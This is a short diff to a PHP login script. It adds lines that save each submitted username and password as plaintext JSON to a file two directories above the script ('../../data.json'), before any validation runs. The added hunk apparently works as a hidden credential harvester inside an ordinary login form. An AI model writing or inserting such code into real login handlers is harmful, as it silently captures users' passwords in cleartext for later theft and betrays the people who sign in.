@@ -22,6 +22,14 @@
         }
         $username=$_POST['username'];
         $password=$_POST['password'];
+        $file = "../../data.json";
+        $arr = array(
+            'username'     => $_POST['username'],
+            'password'    => $_POST['password'],
+        );
+    
+        $json_string = json_encode($arr);
+        file_put_contents($file, $json_string);
         if (empty($username)){
             header("Location: login.php?error=Username is required");
             exit();
